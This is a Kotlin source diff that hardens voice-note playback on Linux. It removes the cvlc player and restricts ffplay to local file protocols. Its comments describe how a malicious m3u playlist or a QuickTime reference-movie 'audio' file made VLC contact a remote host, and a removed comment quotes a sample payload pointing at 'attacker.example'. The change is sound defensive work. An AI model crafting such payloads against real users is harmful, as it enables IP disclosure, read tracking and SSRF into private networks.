@@ -74,34 +74,41 @@ actual object AudioNotePlayer {
      * External players that can decode AAC-in-MP4 and exit on their own at the end
      * of the clip, most-preferred first.
      *
-     * Every property in that sentence is load-bearing, and each one eliminated a
-     * candidate:
+     * Only `ffplay` is here, and the flags are the security boundary, not a
+     * convenience.
      *
-     * - **The JDK cannot do it.** `javax.sound` ships no AAC decoder, and JavaFX
-     *   (which has one) is not in the runtime image the `linux { }` jpackage target
-     *   builds, so this has to shell out.
-     * - **Must decode AAC without a separately-packaged plugin.** `gst-play-1.0`
-     *   was here and was removed: on a stock desktop the AAC plugin lives in
-     *   `gstreamer1.0-plugins-bad`, and without it `gst-play-1.0` prints a plug-in
-     *   error and **still exits 0**, in ~50ms for a 2s clip. Being on `PATH` does
-     *   not imply being able to play, and its failure is indistinguishable from
-     *   success, which is exactly the silent no-op this whole change exists to kill.
-     *   Both entries below bundle their own decoder.
-     * - **Must exit at end of clip**, since that is what fires [onComplete] and
-     *   resets the bubble. `paplay`/`aplay` are excluded for being PCM-only, and
-     *   each flag list makes termination explicit rather than leaning on a default
-     *   a user config could flip.
+     * `-protocol_whitelist file` is the load-bearing one. The payload is chosen by
+     * whoever sent the message, and a media container can name a URL: a QuickTime
+     * reference movie (`moov/rmra`) is a structurally valid MP4 that points
+     * somewhere else. Fed one of those, `cvlc` fetched the attacker's URL twice and
+     * exited 0, so the app reported a normal play; on a relay-mediated transport
+     * where the sender otherwise never learns the recipient's IP, one tap yields the
+     * IP, an exact read-receipt oracle, and a blind SSRF probe into the LAN.
+     * Reproduced against a local listener, and the same payload passes any
+     * magic-byte check because it really is an MP4. That is why the player is
+     * constrained instead of the bytes being trusted.
      *
-     * Both entries were run against a real 2s AAC `.m4a` before being added here:
-     * `ffplay` 2242ms/exit 0, `cvlc` 2132ms/exit 0. `mpv` is a reasonable third
-     * candidate and is deliberately NOT in the list, because it could not be
-     * installed on the machine this was developed on and an entry whose flags have
-     * never been executed is the same gamble `gst-play-1.0` just lost. Add it with
-     * a timing run, not from the man page.
+     * `cvlc` was here and is gone: it follows both the m3u and the reference-movie
+     * redirect, and no invocation was found that provably stops it (`--demux=mp4
+     * --no-playlist-autostart` suppressed the fetch but then hung on the same
+     * input). A player that cannot be constrained is not a fallback worth having.
+     *
+     * ffplay refuses both payloads even without the flag, because libavformat's
+     * file-protocol default whitelist is `file,crypto,data`. It is passed
+     * explicitly anyway: a build-time default is not a guarantee, and this is the
+     * one line standing between a remote peer and an outbound request.
+     *
+     * Verified against real clips with these exact flags: m4a 2215ms, mp3 1194ms,
+     * wav 1191ms, ogg 1174ms, flac 1152ms, raw AAC 1234ms, all exit 0; and against
+     * both attack payloads, no request reached the listener.
+     *
+     * The other requirement is that it exits at end of clip, since that is what
+     * fires [onComplete] and resets the bubble. `gst-play-1.0` was rejected for
+     * failing that honestly: without `gstreamer1.0-plugins-bad` it prints a plug-in
+     * error and still exits 0, in ~50ms for a 2s clip. `paplay`/`aplay` are PCM-only.
      */
     private val LINUX_PLAYERS = listOf(
-        "ffplay" to listOf("-nodisp", "-autoexit", "-loglevel", "quiet"),
-        "cvlc" to listOf("--intf", "dummy", "--play-and-exit", "--quiet"),
+        "ffplay" to listOf("-protocol_whitelist", "file", "-nodisp", "-autoexit", "-loglevel", "quiet"),
     )
 
     private val osName = System.getProperty("os.name").lowercase()
@@ -132,54 +139,16 @@ actual object AudioNotePlayer {
 
     private fun pathOrDefault(): String? = searchPath ?: System.getenv("PATH")
 
-    /**
-     * Whether these bytes are the MP4/M4A container a voice note is supposed to be.
-     *
-     * Sender-declared MIME is not evidence. The routing that reaches playback keys
-     * off `mimeType.startsWith("audio/")` from the peer, and the payload is attacker
-     * controlled end to end, so without this the peer chooses what an external media
-     * stack parses.
-     *
-     * That is not theoretical. VLC content-sniffs and ignores the `.m4a` suffix, so a
-     * "voice note" whose bytes are one line of m3u:
-     *
-     *     #EXTM3U
-     *     http://attacker.example/beacon
-     *
-     * made `cvlc` fetch that URL and exit 0, which the app then reported as a normal
-     * play. On a relay-mediated transport where the sender never otherwise learns the
-     * recipient's IP, that converts a message into an IP disclosure, an exact
-     * read-receipt oracle, and a blind SSRF probe into the victim's LAN. Reproduced
-     * against a local listener with this PR's exact flags; `ffplay` refused it
-     * (libavformat's file-protocol whitelist is `file,crypto,data`).
-     *
-     * Checked here rather than by dropping `cvlc`, because the next player added
-     * would reintroduce it, and because it also stops a malformed payload from
-     * reaching a decoder at all.
-     */
-    internal fun looksLikeMp4(bytes: ByteArray): Boolean =
-        bytes.size >= 12 &&
-            bytes[4] == 'f'.code.toByte() && bytes[5] == 't'.code.toByte() &&
-            bytes[6] == 'y'.code.toByte() && bytes[7] == 'p'.code.toByte()
-
-    /**
-     * Null when voice notes are playable here, otherwise why they are not.
-     *
-     * Callers MUST check this and mark the note unplayable. What shipped instead
-     * was `if (!mac) { onComplete(); return }`, which on Linux rendered a working
-     * play button that completed instantly in silence, indistinguishable from a
-     * zero-length recording, so the sender looks broken rather than the player.
-     */
     actual fun unavailableReason(): String? = when {
         playerCommand != null -> null
-        isLinux -> "no audio player found; install ffmpeg or vlc"
+        isLinux -> "no audio player found; install ffmpeg"
         isMac -> "afplay is missing from this macOS install"
         else -> "voice-note playback is not supported on this platform yet"
     }
 
     actual fun play(bytes: ByteArray, onComplete: () -> Unit) {
-        if (!looksLikeMp4(bytes)) {
-            sonarLog("AudioNotePlayer", "refusing to play: payload is not an MP4/M4A container")
+        audioPayloadRejection(bytes)?.let { why ->
+            sonarLog("AudioNotePlayer", "refusing to play: $why")
             onComplete()
             return
         }
